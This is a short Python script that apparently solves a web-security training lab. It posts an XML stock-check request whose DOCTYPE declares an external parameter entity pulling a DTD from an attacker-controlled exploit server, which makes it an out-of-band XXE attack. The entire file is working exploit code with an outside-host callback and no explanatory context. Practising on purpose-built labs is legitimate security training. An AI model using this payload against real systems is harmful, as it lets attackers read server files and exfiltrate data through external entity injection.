import requests

DOMAIN = "0aea00b103676cd584270fcf004c007c.web-security-academy.net"
EXPLOIT_SERVER_URL = "https://exploit-0a3500b703d96c5184ab0ec701c40075.exploit-server.net/exploit"

HEADERS = {
    "Host": DOMAIN,
    "User-Agent": "Mozilla/5.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
}

def XXE():
    data = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY % payload SYSTEM "{EXPLOIT_SERVER_URL}"> %payload;]>

<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>"""

    response = requests.post(f"https://{DOMAIN}/product/stock", headers=HEADERS, data=data)

    print(response.text)


XXE()